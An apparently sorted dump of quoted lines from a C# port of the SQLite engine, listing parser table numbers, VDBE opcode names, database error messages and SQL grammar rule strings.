"/   134,  287,  552,  455,  461,  444,   69,  443,  334,  463,"
"/   136,  451,  221,  334,  308,  624,  424,  349,  481,  490,"
"/   141,  -17, -111, -111, -111, 1209,   81,  424,  353,  426,"
"/   141,  860,  737,  712,  737,  656,  656,  712, 1017, 1017,"
"/   145,   87,  159,  220,  291,  346,  226,  213,  357,  374,"
"/   146,  147,  215,  221,  231,  232,  152,  165,  154,  150,"
"/   146,  181,  227,   14,  203,  223,  250,  -35,  -35,  224,"
"/   150,   80,   81,   82,   83,   84,   85,   86,   87,   88,"
"/   150,  104,  150,   94,  150,  165,  165,   98,  210,  139,"
"/   150,  150,   98,   84,   85,  150,  150,   65,  150,  150,"
"/   150,  150,  113,  213,  174,  175,  117,   58,  165,   60,"
"/   150,  150,  227,  165,   22,   23,  165,  150,   64,  150,"
"/   150,  157,  165,   64,  165,  105,  106,  107,   84,   85,"
"/   150,  165,  150,  165,  150,  150,  165,  165,  129,  130,"
"/   150,  165,  165,  104,  165,  174,  175,  177,  109,   48,"
"/   150,  174,  175,   48,   49,   94,   95,  110,   40,  165,"
"/   150,  226,  218,  231,  232,  216,  150,  196,  110,   26,"
"/   156,   44,  157,  156,  135,  157,  157,  238,  156,  239,"
"/   157,   37,  246,    1,  164,  180,  180,  249,   15,  219,"
"/   157,   66,  189,  189,   22,  219,  157,  199,   18,  192,"
"/   160,  150,  177,  150,  150,  150,  248,  249,  174,  175,"
"/   160,  165,  209,  150,  112,  150,  114,  115,    7,    8,"
"/   161,  162,  150,  221,  165,   94,   28,  150,  165,   56,"
"/   162,  379,  377,  163,   51,  209,  569,  282,  164,  570,"
"/   165,   23,   23,   25,   25,  211,  165,  165,  165,  176,"
"/   165,   49,  170,  171,  160,  181,  182,   48,   49,  174,"
"/   165,   98,  242,  112,  194,  114,  115,  199,  187,  174,"
"/   165,  150,  149,  174,  175,  150,  241,   48,   49,  174,"
"/   165,  150,  165,  174,  175,   19,  150,   48,   49,  174,"
"/   165,  165,   26,   27,   22,   23,  150,  165,  174,  175,"
"/   165,  165,  177,  150,   23,   25,  165,  138,  165,  174,"
"/   165,  165,  210,  165,  165,  165,  150,  165,  150,  165,"
"/   165,  174,  175,   13,  151,  174,  175,   68,   69,   70,"
"/   165,  174,  175,  103,  178,   48,   49,  174,  175,  128,"
"/   165,  197,  160,  170,  171,   48,   49,  165,  204,  174,"
"/   171,  174,  175,   66,   67,   68,   69,   70,   71,   72,"
"/   174,  175,   36,  150,   25,   54,  150,  150,  150,  150,"
"/   174,  175,  209,    6,  165,   29,  199,  150,  165,   33,"
"/   174,  175,  213,   26,  165,  169,  170,  171,   23,  150,"
"/   174,  412,  298,  337,  424,  452,  452,  452,  453,  454,"
"/   175,   43,  165,   45,  185,  186,  174,  175,  169,  170,"
"/   175,  149,  165,   47,  194,  149,  165,   16,  160,  149,"
"/   175,  174,  175,   27,  165,  228,  165,  112,   49,  114,"
"/   175,  187,  109,  242,   67,   68,   69,   70,   71,   72,"
"/   175,  232,  188,  165,  165,   21,   94,    0,    1,    2,"
"/   175,  241,  166,   48,   49,  174,  175,  113,  165,   98,"
"/   176,  179,  176,  176,  179,  230,  230,  184,  157,  156,"
"/   186,   96,   97,   98,   99,  100,  101,  102,   94,   95,"
"/   187,   66,   67,   68,   69,   70,   71,   72,   73,   74,"
"/   187, 1061, 1170, 1061, 1194, 1194,   -2,   64,   64,  -19,"
"/   189,  415,  302,  627,  960,  960,  960,  960,  411,"
"/   192,  192,  192,  189,  199,  157,   39,  243,  243,  157,"
"/   193,  150,  105,  106,  107,  135,  174,  175,   54,  150,"
"/   194,   80,   81,   82,   83,   84,   85,   86,   87,   88,"
"/   194,  118,  174,  175,  165,  165,  165,  193,  150,  157,"
"/   194,  161,  162,  166,  160,  165,  120,  166,  174,  175,"
"/   195,   97,  150,  222,  109,  224,  225,   26,  104,  105,"
"/   198,  220,   65,   94,  105,  106,  107,  181,   94,   95,"
"/   199,  140,  337,  487,  334,  526,  527,  551,  516,  508,"
"/   202,  -35,  -35,  -35,  -35,  339,  309,  312,  381,  317,"
"/   206,  207,  150,   28,  165,  190,  191,  181,   23,  150,"
"/   210,  455,  461,   66,  581,  444,   93,  422,  423,  626,"
"/   211,  334,  294,  356,  340,  337,  468,  468,  532,  533,"
"/   212,  268,  550,  337,  268,  389,  329,  177,  444,   81,"
"/   215,  108,  150,   25,  148,  150,   64,   22,  216,   24,"
"/   217,   90,  120,   48,   49,   50,   86,  165,   97,   98,"
"/   218,  413,  477,  220,  578,   40,  545,   23,   22,  315,"
"/   220,  150,  138,   24,  160,   26,   22,   94,   95,  165,"
"/   223,  320,  607,  193,  238,  337,  481,   16,  351,  185,"
"/   229,   94,  174,  175,  213,  234,  165,   25,  150,  150,"
"/   232,  232,  268,  427,  575,  645,  788,  208,  861,  699,"
"/   232,  626,  948,  504,  948,  231,  444,  132,   47,   23,"
"/   233,   66,   67,   68,   69,   70,   71,   72,   73,   74,"
"/   233,  230,  499,  455,  461,   57,  515,  334,  135,  260,"
"/   235,  280,  204,  205,  206,   42,  444,   94,  346,  435,"
"/   236,   48,   49,   22,   55,  174,  175,   26,   27,   22,"
"/   239,  240,  241,  146,  243,  249,  547,  593,  158,  433,"
"/   240,   60,  150,  160,  151,   19,   20,   36,   22,  165,"
"/   241,   22,   23,  166,   25,  187,  174,  175,  126,   66,"
"/   245,  610,  337,   30,  269,   32,  137,  448,  608,  609,"
"/   246,  327,  622,  448,  397,  286,  285,  551,  425,  426,"
"/   269,   23,   22,  315,  465,  466,  462,  462,   25,   25,"
"/   271,  310,  158,  424,  296,  424,  216,   36,  335,  336,"
"/   275,   48,  277,  522,  279,  424,  424,  450,  255,  409,"
"/   309,  337,  181,  334,  499,   56,  139,  337,  219,  268,"
"/   309,  452,  452,  452,  159,  399,  311,  366,  369,  370,"
"/   309,  959,  178,  628,    2,  153,  216,  448,   24,   24,"
"/   318,  455,  461,  394,  523,   21,  188,  504,  371,   27,"
"/   319,  530,  531,  535,  264,  107,  228,  536,  534,  375,"
"/   322,   23,   33,  315,  465,  466,  462,  462,   25,   25,"
"/   326,  337,  874,  153,  194,  448,    1,  425,  426,  334,"
"/   330,  419,  222,  350,  604,  219,  215,  424,  112,  337,"
"/   333,  423,  337,  172,  280,  581,  208,  444,   17,  171,"
"/   334,  157,  606,  408,  213,  563,  538,  455,  461,  444,"
"/   334,  217,  195,  606,  605,  455,  461,  334,   18,  444,"
"/   334,  261,  392,  340,  445,  468,  468,  587,  323,  444,"
"/   334,  337,  420,  444,   86,  253,  234,  455,  461,  444,"
"/   334,  424,  548,  337,  180,  158,  334,  292,  424,  444,"
"/   334,  508,  334,  444,  101,  359,  252,  455,  461,  444,"
"/   335,  336,  444,   75,  450,  200,  506,  216,  154,  597,"
"/   337,   26,   26,   26,   26,   27,   27,   28,   28,   28,"
"/   337,  251,  404,  407,  219,  355,  556,    4,  371,  422,"
"/   339,  455,  461,  444,   68,  444,   98,  334,  254,  504,"
"/   340,  442,  468,  468,  427,  428,  429,  444,   80,  281,"
"/   341,   19,  173,  447,  424,  422,  423,  334,  337,  424,"
"/   341,  413,  485,  557,  629,  701,  773,  845,  773,  773,"
"/   346,  424,  334,  424,  334,  594,  280,  444,   90,  424,"
"/   357,  584,  585,  452,  452,  452,  453,  454,   10,  259,"
"/   362,  337,  258,  268,  622,  549,  444,  133,  203,  140,"
"/   364,  265,  365,  156,  425,  426,  444,   78,  417,  414,"
"/   372,   52,   53,  118,  591,  169,  114,  170,  595,  125,"
"/   376,  457,  515,  570,  619,  584,  687,  705,  709,  765,"
"/   384,  448,  444,  129,  382,  387,  334,  168,  337,  389,"
"/   385,  143,  580,  116,  119,  183,  400,  590,  401,  121,"
"/   388,  276,  280,  207,  147,   35,  344,  341,    3,  334,"
"/   389,  337,  443,  325,  444,   77,  442,  293,  334,  291,"
"/   393,  424,  289,  424,  592,  603,  424,  424,  452,  452,"
"/   409,    1,    1,  141,  318,  318, -110,   53,  197,  269,"
"/   417,    2,    2,    2,    2,  158,  336,  526,  576,  863,"
"/   419,  419,  841,  101, -110, -110, -110, -111, -111, -111,"
"/   422,  423,  422,  423,   29,  218,  334,  613,  444,   71,"
"/   422,  423,  425,  426,  159,  425,  426,  366,  369,  370,"
"/   423,  397,  286,  285,  244,  334,  540,  566,   63,  455,"
"/   424,  334,  333,  423,  308,  623,  280,  424,  444,   74,"
"/   424,  373,  577,  158,  158,  511,  424,  424,  424,  525,"
"/   424,  424,  257,  424,  424,  424,  284,  424,  386,  424,"
"/   424,  444,   70,  535,  368,  455,  461,  444,   82,  405,"
"/   424,  444,   88,  432,  145,  444,   73,  315,  465,  466,"
"/   425,  426,  334,  159,  337,  216,  366,  369,  370,  494,"
"/   429,  437,  442,  486,  499,  505,  507,  519,  558,  571,"
"/   437,  313,  201,  314,  670,  671,  672,  149,  150,  467,"
"/   438,   63,  337,  361,  424,  448,  487,  337,  424,  544,"
"/   441,   90,  565,  565,    1,    1,    1,    1,    1,    1,"
"/   444,   84,  403,  144,  334,  574,  600,  337,  424,  573,"
"/   444,   89,  341,  337,    6,  346,  338,  337,  421,  337,"
"/   444,   96,  317,  448,  334,  342,  472,  473,  469,  337,"
"/   445,   26,   26,   26,   26,   27,   27,   28,   28,   28,"
"/   445,  152,  444,   95,  424,  424,  424,  236,  503,  491,"
"/   445,  618,   63,  504,  198,  424,  501,  449,  444,   72,"
"/   450,  581,  441,  444,   78,   23,   22,  315,  465,  466,"
"/   452,  297,  300,  301,  505,  424,  617,  424,  363,  424,"
"/   452,  452,  452,  453,  454,   10,  598,  280,   20,   46,"
"/   456,  457,  334,  444,   67,  455,  461,  334,  488,  476,"
"/   458,  334,  272,  621,  307,  337,  312,  337,  374,   64,"
"/   461,   31,   26,   26,   26,   26,   27,   27,   28,   28,"
"/   461,  424,  216,  478,  444,   93,   28,   28,   28,   29,"
"/   461,  444,   59,  334,  424,  424,  391,  340,    8,  468,"
"/   462,  462,   25,   25,   24,   24,   24,   24,  337,   26,"
"/   462,  462,   25,   25,   24,   24,   24,   24,  395,   26,"
"/   462,  462,   25,   25,   24,   24,   24,   24,  445,   26,"
"/   464,   34,  483,  471,  480,  184,  197,  502,  484,    5,"
"/   465,  466,  462,  462,   25,   25,   24,   24,   24,   24,"
"/   468,  263,  444,  102,  390,  290,  321,   23,   22,  315,"
"/   468,  424,  493,  444,  105,   23,   22,  315,  465,  466,"
"/   470,  424,   65,  332,  280,  481,  446,  445,  334,  247,"
"/   473,  444,   85,   23,   22,  315,  465,  466,  462,  462,"
"/   474,   23,   22,  315,  465,  466,  462,  462,   25,   25,"
"/   481,  444,   91,  444,   92,   38,   37,  625,  337,  410,"
"/   485,  151,  489,   44,  141,   11,  106,  160,  225,  518,"
"/   486,  130,  498,  607,   30,  337,   32,  137,  351,  396,"
"/   507,  179,  424,  481,  424,  402,  295,  285,   38,   37,"
"/   508,  424,  334,  311,  424,  444,  131,  496,  269,  455,"
"/   509,  266,  450,  190,  191,  539,  267,  625,  558,  273,"
"/   519,   49,  510,  108,  367,  270,   12,  155,  109,   50,"
"/   528,  444,   76,   39,  424,   41,  444,   97,  579,  527,"
"/   529,  459,  460,   23,   22,  315,  465,  466,  462,  462,"
"/   537,   60,  224,  479,  343,  202,  398,  337,  439,  554,"
"/   542,  541,  334,  475,  475,  337,  424,  216,  334,  424,"
"/   556,  444,    9,  455,  461,  425,  426,  371,  495,  334,"
"/   557,  148,  135,  260,  364,  265,  365,  156,  425,  426,"
"/   559,  304,  560,  561,  305,  227,  229,  553,  567,  161,"
"/   577,  588,  630,  643,  649,  651,  662,  702,  715,  721,"
"/   582,   26,   26,   26,   26,   27,   27,   28,   28,   28,"
"/   588,  424,  154,  589,  601,   54,   54,  620,  512,  306,"
"/   616,  619,   62,  418,  103,  226,  111,  176,  242,  182,"
"/   634,  869,  958,  958,  869,  958,  958,  898,  898,  757,"
"/   638,  641,  667,  668,  670,  671,  672,  643,  644,  645,"
"/   639,  639,  650,  650,  716,  958,  796,  787,  789,  779,"
"/   642,  749,  675,  759,  958,  958,  958,  662,  738,  904,"
"/   646,  647,  649,  653,  651,  652,  654,  661,  663,  682,"
"/   663,  667, -134,  780,  888,  933, 1066,   44,  672,  698,"
"/   676,  677,  680,  681,  894,  896,  895,  897,  679,  678,"
"/   684,  686,  747,  748,  812,  741,  742,  746,  669,  823,"
"/   687,  688,  820,  689,  690,  691,  729,  732,  733,  734,"
"/   692,  711,  714,  715,  693,  700,  694,  695,  702,  703,"
"/   704,  707,  708,  709,  710,  705,  706,  876,  877,  880,"
"/   723,  724,  725,  727,  719,  720,  664,  655,  658,  767,"
"/   726,  786,  730,  778,  741,  803,  813,  827,  883,  892,"
"/   728,  728,  713,  728,  699,  728,  875,  879,  879,  713,"
"/   728,  728,  728,  875,  657,  765,  657,  765,  657,  765,"
"/   733,  774,  787,  793,  805,  846,  859,  865,  877,  881,"
"/   737,  737,  737,  737,  796,  730,  808,  765,  935,  935,"
"/   743,  958,  958,  958,  958,  958,  958,  958,  958,  958,"
"/   749, 1137, 1031, 1082, 1232,  801, 1097, 1153,  873, 1011,"
"/   757,  757,  958,  958,  958,  958,  958,  751,  761,  950,"
"/   765,  765,  943,  683,  701,  701,  950,  955,  955,  958,"
"/   765,  908,  910,  657,  765,  730,  730,  808,  796,  765,"
"/   766,  859,  842,  781,  784,  785,  782,  750,  760,  768,"
"/   769,  770,  771,  755,  756,  762,  777,  810,  811,  775,"
"/   773,  773,  773,  773,  773,  773,  773,  773,  773,  773,"
"/   773,  773,  773,  773,  773,  773,  917,  989,  989,  -67,"
"/   776,  763,  764,  752,  753,  754,  857,  813,  825,  826,"
"/   791,  134,  501,  716,  521,  794,  589,  -47,  650,  590,"
"/   791,  958,  765,  765,  773,  778,  773,  778,  773,  778,"
"/   795,  942,  974,  986, 1003, 1047, 1074,  935, 1091,    2,"
"/   798,  801,  803,  883,  885,  887,  889,  890,  891,  892,"
"/   799,  800,  806,  807,  933,  931,  829,  828,  847,  831,"
"/   804,  805,  899,  912,  915,  917,  918,  919,  809,  920,"
"/   814,  818,  819,  821,  822,  836,  837,  839,  845,  852,"
"/   824,  478,  498,  498,  656,  498,  262,  498,  141,  498,"
"/   824,  827,  860,  861,  924,  925,  926,  927,  928,  856,"
"/   850,  956,  380,  308,   89,  496,  384,    2,    2,    2,"
"/   853,  830,  840,  665,  832,  833,  958,  958,  958,  958,"
"/   853, 1163, 1257, 1328, 1329, 1337, 1340, 1341,  736, 1344,"
"/   855,  838,  843,  844,  846,  851,  854,  744,  745,  858,"
"/   862,  864,  863,  870,  794,  783,  790,  797,  772,  911,"
"/   867,  958,  958,  958,  958,  958,  958,  932,  958,  958,"
"/   878,  697,  698,  712,  685,  674,  666,  718,  721,  722,"
"/   885,  966,  405,  428,  968, 1039, 1069, 1099, 1100,  966,"
"/   893,  886,  888,  930,  934,  937,  939,  940,  941,  944,"
"/   896,  900,  903,  943,  964,  932,  930,  958,  984, 1015,"
"/   897,  784,  637,   52,  183,  183,  183,  902,  902,  996,"
"/   900,  909,  905,  901,  902,  903,  659,  872,  873,  731,"
"/   922,  913,  947,  656,  735,  736,  739,  881,  929,  795,"
"/   934,  936,  963,  967,  969,  998, 1053, 1072, 1088, -179,"
"/   942,  958,  958,  945,  635,  958,  630,  632,  633,  637,"
"/   946,  951,  952,  953,  956,  957,  954,  636,  631,"
"/   949,  303,  949,  500,  479,  555,  202,   43,  445,   23,"
"/   958,  648,  958,  667,  815,  820,  816,  958,  817,  958,"
"/   958,  699,  916,  796,  916,  774,  774,  796,  639,  639,"
"/   958,  726,  660,  958,  958,  958,  958,  958,  958,  958,"
"/   958,  835,  848,  849,  850,  958,  958,  958,  958,  958,"
"/   958,  865,  786,  786,  774,  786,  696,  786,  958,  786,"
"/   958,  868,  958,  780,  958,  788,  958,  958,  958,  958,"
"/   958,  882,  958,  936,  938,  958,  958,  958,  634,  757,"
"/   958,  906,  907,  958,  958,  958,  958,  958,  958,  914,"
"/   958,  923,  921,  740,  802,  958,  749,  758,  958,  958,"
"/   958,  958,  717,  958,  958,  958,  958,  958,  958,  958,"
"/   958,  958,  958,  673,  898,  898,  761,  792,  958,  958,"
"/   958,  958,  958,  958,  640,  958,  958,  958,  958,  958,"
"/   958,  958,  958,  958,  958,  958,  793,  958,  871,  866,"
"/   958,  958,  958,  958,  958,  958,  958,  958,  884,  958,"
"/   958,  958,  958,  958,  958,  958,  958,  958,  958,  834,"
"/   958,  958,  958,  958,  958,  958,  958,  958,  958,  841,"
"/   958,  958,  958,  958,  958,  958,  958,  958,  958,  958,"
"/  -141,   82,  154,  284,   12,   75,   69,   73,  142,  -59,"
"/  1017, 1017, 1040, 1040, 1089, -110, 1024, 1034, 1075, 1093,"
"/  1030, 1025, 1112, 1114, 1098, 1133, 1102, 1144, 1119, 1157,"
"/  1059,  902,  902,  902,  902,  275,  689,  -13,  141,  824,"
"/  1073, 1110, 1143, 1143, 1197, 1199, 1197, 1199, 1197, 1199,"
"/  1101, 1107, 1109, 1118, 1120, 1140, 1141, 1145, 1146, 1148,"
"/  1143, 1143, 1384, -111, -111, -111, -111, -111, -111,  552,"
"/  1143, 1347, 1259, 1361, 1143, 1335, 1335, 1382, 1024, 1143,"
"/  1149, 1150, 1152, 1154, 1166, 1168, 1171, 1172, 1180, 1182,"
"/  1183, 1195, 1188, 1198, 1200, 1201, 1202, 1155, 1156, 1203,"
"/  1184, 1185, 1191, 1192, 1193, 1196,  403,  403,  652,  377,"
"/  1194, 1194, 1194, 1194, 1194,  276,    1,  125, 1076, 1194,"
"/  1194, 1194, 1194, 1194, 1194, 1194, 1194, 1194, 1194,  -48,"
"/  1194, 1194, 1194, 1194, 1194, 1194, 1194, 1194, 1194, 1194,"
"/  1204, 1206, 1207, 1205, 1233, 1231, 1234, 1235, 1237, 1238,"
"/  1217, 1218, 1219, 1220, 1215, 1224, 1210, 1258, 1174, 1175,"
"/  1239, 1159, 1160, 1242, 1243, 1213, 1214, 1186, 1208, 1249,"
"/  1244, 1244, 1244, 1353, 1361, 1143, 1361, 1143, 1361, 1143,"
"/  1244, 1244, 1324, 1244, 1270, 1244, 1353, 1286, 1286, 1324,"
"/  1262, 1263, 1176, 1260, 1245, 1246, 1178, 1179, 1181,"
"/  1326, 1419, 1420, 1421, 1423, 1431, 1424, 1425, 1426, 1427,"
"/  1336, 1436, 1437, 1438, 1408, 1439, 1414, 1441, 1442, 1446,"
"/  1376, 1478, 1380, 1392, 1378, 1482, 1375, 1483, 1484, 1492,"
"/  1390, 1390, 1390, 1390, 1024, 1335, 1382, 1143, 1377, 1377,"
"/  1422, 1413, 1407, 1410, 1316, 1317, 1318, 1319, 1320, 1342,"
"/  1429, 1428, 1415, 1430, 1432, 1428, 1327, 1434, 1433, 1435,"
"/  1444, 1445, 1452, 1451, 1343, 1374, 1457, 1475, 1481, 1365,"
"/  1447, 1440, 1448, 1355, 1362, 1453, 1454, 1449, 1371, 1443,"
"/  1450, 1459, 1379, 1417, 1418, 1366, 1466, 1370, 1493, 1479,"
"/  1455, 1494, 1372, 1488, 1508, 1509,"
"/  OP_SeekGt,"
"/  OP_SeekLe,"
"/  OP_SeekLt,"
"/  new u8[]{    0,  1,     1,      1,      1,    1,       1,   1,  },"
"/  new u8[]{    0,  2,     2,      1,      3,    1,       1,   1,  },"
"/  new u8[]{    0,  3,     1,      1,      1,    3,       4,   1,  },"
"/  new u8[]{    0,  6,     4,      4,      4,    4,       4,   4,  },"
"/  new u8[]{    5,  4,     4,      4,      4,    4,       4,   4,  },"
"/  new u8[]{    5,  5,     4,      4,      4,    4,       4,   6,  },"
"/ "" INT"","
"/ "" NUM"","
"/ "" REAL"""
"/ "" TEXT"","
"/ """","
"/ ""Add"","
"/ ""AddImm"","
"/ ""Affinity"","
"/ ""AggFinal"","
"/ ""AggStep"","
"/ ""And"","
"/ ""AutoCommit"","
"/ ""BitAnd"","
"/ ""BitNot"","
"/ ""BitOr"","
"/ ""Blob"","
"/ ""Clear"","
"/ ""Close"","
"/ ""CollSeq"","
"/ ""Column"","
"/ ""Compare"","
"/ ""Concat"","
"/ ""ContextPop"","
"/ ""ContextPush"","
"/ ""Copy"","
"/ ""Count"","
"/ ""CreateIndex"","
"/ ""CreateTable"","
"/ ""Delete"","
"/ ""Destroy"","
"/ ""Divide"","
"/ ""DropIndex"","
"/ ""DropTable"","
"/ ""DropTrigger"","
"/ ""Eq"","
"/ ""Expire"","
"/ ""Explain"","
"/ ""Found"","
"/ ""Function"","
"/ ""Ge"","
"/ ""Gosub"","
"/ ""Goto"","
"/ ""Gt"","
"/ ""Halt"","
"/ ""HaltIfNull"","
"/ ""IdxDelete"","
"/ ""IdxGE"","
"/ ""IdxInsert"","
"/ ""IdxLT"","
"/ ""IdxRowid"","
"/ ""If"","
"/ ""IfNeg"","
"/ ""IfNot"","
"/ ""IfPos"","
"/ ""IfZero"","
"/ ""IncrVacuum"","
"/ ""Insert"","
"/ ""Int64"","
"/ ""Integer"","
"/ ""IntegrityCk"","
"/ ""IsNull"","
"/ ""IsUnique"","
"/ ""Jump"","
"/ ""Last"","
"/ ""Le"","
"/ ""LoadAnalysis"","
"/ ""Lt"","
"/ ""MakeRecord"","
"/ ""MemMax"","
"/ ""Move"","
"/ ""Multiply"","
"/ ""MustBeInt"","
"/ ""Ne"","
"/ ""NewRowid"","
"/ ""Next"","
"/ ""Noop"","
"/ ""Not"","
"/ ""NotExists"","
"/ ""NotFound"","
"/ ""NotNull"","
"/ ""NotUsed_134"","
"/ ""NotUsed_135"","
"/ ""NotUsed_136"","
"/ ""NotUsed_137"","
"/ ""NotUsed_138"","
"/ ""NotUsed_139"","
"/ ""NotUsed_140"","
"/ ""Null"","
"/ ""NullRow"","
"/ ""OpenEphemeral"","
"/ ""OpenPseudo"","
"/ ""OpenRead"","
"/ ""OpenWrite"","
"/ ""Or"","
"/ ""Pagecount"","
"/ ""ParseSchema"","
"/ ""Permutation"","
"/ ""Prev"","
"/ ""ReadCookie"","
"/ ""Real"","
"/ ""RealAffinity"","
"/ ""Remainder"","
"/ ""ResetCount"","
"/ ""ResultRow"","
"/ ""Return"","
"/ ""Rewind"","
"/ ""RowData"","
"/ ""RowKey"","
"/ ""RowSetAdd"","
"/ ""RowSetRead"","
"/ ""RowSetTest"","
"/ ""Rowid"","
"/ ""SCopy"","
"/ ""SQL logic error or missing database"","
"/ ""Savepoint"","
"/ ""Seek"","
"/ ""SeekGe"","
"/ ""SeekGt"","
"/ ""SeekLe"","
"/ ""SeekLt"","
"/ ""Sequence"","
"/ ""SetCookie"","
"/ ""SetNumColumns"","
"/ ""ShiftLeft"","
"/ ""ShiftRight"","
"/ ""Sort"","
"/ ""Statement"","
"/ ""String"","
"/ ""String8"","
"/ ""Subtract"","
"/ ""TableLock"","
"/ ""ToBlob"","
"/ ""ToInt"","
"/ ""ToNumeric"","
"/ ""ToReal"","
"/ ""ToText"","
"/ ""Trace"","
"/ ""Transaction"","
"/ ""VBegin"","
"/ ""VColumn"","
"/ ""VCreate"","
"/ ""VDestroy"","
"/ ""VFilter"","
"/ ""VNext"","
"/ ""VOpen"","
"/ ""VRename"","
"/ ""VUpdate"","
"/ ""Vacuum"","
"/ ""Variable"","
"/ ""VerifyCookie"","
"/ ""Yield"","
"/ ""access permission denied"","
"/ ""add_column_fullname ::= fullname"","
"/ ""anylist ::= anylist ANY"","
"/ ""anylist ::= anylist LP anylist RP"","
"/ ""anylist ::="","
"/ ""as ::= AS nm"","
"/ ""as ::= ids"","
"/ ""as ::="","
"/ ""attempt to write a readonly database"","
"/ ""authorization denied"","
"/ ""autoinc ::= AUTOINCR"","
"/ ""autoinc ::="","
"/ ""auxiliary database format error"","
"/ ""between_op ::= BETWEEN"","
"/ ""between_op ::= NOT BETWEEN"","
"/ ""bind or column index out of range"","
"/ ""callback requested query abort"","
"/ ""carg ::= CONSTRAINT nm ccons"","
"/ ""carg ::= ccons"","
"/ ""carglist ::= carglist carg"","
"/ ""carglist ::="","
"/ ""case_else ::= ELSE expr"","
"/ ""case_else ::="","
"/ ""case_exprlist ::= WHEN expr THEN expr"","
"/ ""case_exprlist ::= case_exprlist WHEN expr THEN expr"","
"/ ""case_operand ::= expr"","
"/ ""case_operand ::="","
"/ ""ccons ::= CHECK LP expr RP"","
"/ ""ccons ::= COLLATE ids"","
"/ ""ccons ::= DEFAULT LP expr RP"","
"/ ""ccons ::= DEFAULT MINUS term"","
"/ ""ccons ::= DEFAULT PLUS term"","
"/ ""ccons ::= DEFAULT id"","
"/ ""ccons ::= DEFAULT term"","
"/ ""ccons ::= NOT NULL onconf"","
"/ ""ccons ::= NULL onconf"","
"/ ""ccons ::= PRIMARY KEY sortorder onconf autoinc"","
"/ ""ccons ::= REFERENCES nm idxlist_opt refargs"","
"/ ""ccons ::= UNIQUE onconf"","
"/ ""ccons ::= defer_subclause"","
"/ ""cmd ::= ALTER TABLE add_column_fullname ADD kwcolumn_opt column"","
"/ ""cmd ::= ALTER TABLE fullname RENAME TO nm"","
"/ ""cmd ::= ANALYZE nm dbnm"","
"/ ""cmd ::= ANALYZE"","
"/ ""cmd ::= ATTACH database_kw_opt expr AS expr key_opt"","
"/ ""cmd ::= BEGIN transtype trans_opt"","
"/ ""cmd ::= COMMIT trans_opt"","
"/ ""cmd ::= DELETE FROM fullname indexed_opt where_opt"","
"/ ""cmd ::= DETACH database_kw_opt expr"","
"/ ""cmd ::= DROP INDEX ifexists fullname"","
"/ ""cmd ::= DROP TABLE ifexists fullname"","
"/ ""cmd ::= DROP TRIGGER ifexists fullname"","
"/ ""cmd ::= DROP VIEW ifexists fullname"","
"/ ""cmd ::= END trans_opt"","
"/ ""cmd ::= PRAGMA nm dbnm EQ minus_num"","
"/ ""cmd ::= PRAGMA nm dbnm EQ nmnum"","
"/ ""cmd ::= PRAGMA nm dbnm LP minus_num RP"","
"/ ""cmd ::= PRAGMA nm dbnm LP nmnum RP"","
"/ ""cmd ::= PRAGMA nm dbnm"","
"/ ""cmd ::= REINDEX nm dbnm"","
"/ ""cmd ::= REINDEX"","
"/ ""cmd ::= RELEASE savepoint_opt nm"","
"/ ""cmd ::= ROLLBACK trans_opt TO savepoint_opt nm"","
"/ ""cmd ::= ROLLBACK trans_opt"","
"/ ""cmd ::= SAVEPOINT nm"","
"/ ""cmd ::= UPDATE orconf fullname indexed_opt SET setlist where_opt"","
"/ ""cmd ::= VACUUM nm"","
"/ ""cmd ::= VACUUM"","
"/ ""cmd ::= create_table create_table_args"","
"/ ""cmd ::= create_vtab LP vtabarglist RP"","
"/ ""cmd ::= create_vtab"","
"/ ""cmd ::= createkw temp VIEW ifnotexists nm dbnm AS select"","
"/ ""cmd ::= createkw trigger_decl BEGIN trigger_cmd_list END"","
"/ ""cmd ::= createkw uniqueflag INDEX ifnotexists nm dbnm ON nm LP idxlist RP"","
"/ ""cmd ::= insert_cmd INTO fullname inscollist_opt DEFAULT VALUES"","
"/ ""cmd ::= insert_cmd INTO fullname inscollist_opt VALUES LP itemlist RP"","
"/ ""cmd ::= insert_cmd INTO fullname inscollist_opt select"","
"/ ""cmd ::= select"","
"/ ""cmdlist ::= cmdlist ecmd"","
"/ ""cmdlist ::= ecmd"","
"/ ""cmdx ::= cmd"","
"/ ""collate ::= COLLATE ids"","
"/ ""collate ::="","
"/ ""column ::= columnid type carglist"","
"/ ""columnid ::= nm"","
"/ ""columnlist ::= column"","
"/ ""columnlist ::= columnlist COMMA column"","
"/ ""conslist ::= conslist COMMA tcons"","
"/ ""conslist ::= conslist tcons"","
"/ ""conslist ::= tcons"","
"/ ""conslist_opt ::= COMMA conslist"","
"/ ""conslist_opt ::="","
"/ ""constraint failed"","
"/ ""create_table ::= createkw temp TABLE ifnotexists nm dbnm"","
"/ ""create_table_args ::= AS select"","
"/ ""create_table_args ::= LP columnlist conslist_opt RP"","
"/ ""create_vtab ::= createkw VIRTUAL TABLE nm dbnm USING nm"","
"/ ""createkw ::= CREATE"","
"/ ""database disk image is malformed"","
"/ ""database is locked"","
"/ ""database or disk is full"","
"/ ""database schema has changed"","
"/ ""database table is locked"","
"/ ""database_kw_opt ::= DATABASE"","
"/ ""database_kw_opt ::="","
"/ ""datatype mismatch"","
"/ ""dbnm ::= DOT nm"","
"/ ""dbnm ::="","
"/ ""defer_subclause ::= DEFERRABLE init_deferred_pred_opt"","
"/ ""defer_subclause ::= NOT DEFERRABLE init_deferred_pred_opt"","
"/ ""defer_subclause_opt ::= defer_subclause"","
"/ ""defer_subclause_opt ::="","
"/ ""disk I/O error"","
"/ ""distinct ::= ALL"","
"/ ""distinct ::= DISTINCT"","
"/ ""distinct ::="","
"/ ""ecmd ::= SEMI"","
"/ ""ecmd ::= explain cmdx SEMI"","
"/ ""escape ::= ESCAPE expr"","
"/ ""escape ::="","
"/ ""explain ::= EXPLAIN QUERY PLAN"","
"/ ""explain ::= EXPLAIN"","
"/ ""explain ::="","
"/ ""expr ::= BITNOT expr"","
"/ ""expr ::= CASE case_operand case_exprlist case_else END"","
"/ ""expr ::= CAST LP expr AS typetoken RP"","
"/ ""expr ::= EXISTS LP select RP"","
"/ ""expr ::= ID LP STAR RP"","
"/ ""expr ::= ID LP distinct exprlist RP"","
"/ ""expr ::= JOIN_KW"","
"/ ""expr ::= LP expr RP"","
"/ ""expr ::= LP select RP"","
"/ ""expr ::= MINUS expr"","
"/ ""expr ::= NOT expr"","
"/ ""expr ::= PLUS expr"","
"/ ""expr ::= RAISE LP IGNORE RP"","
"/ ""expr ::= RAISE LP raisetype COMMA nm RP"","
"/ ""expr ::= REGISTER"","
"/ ""expr ::= VARIABLE"","
"/ ""expr ::= expr AND expr"","
"/ ""expr ::= expr BITAND"
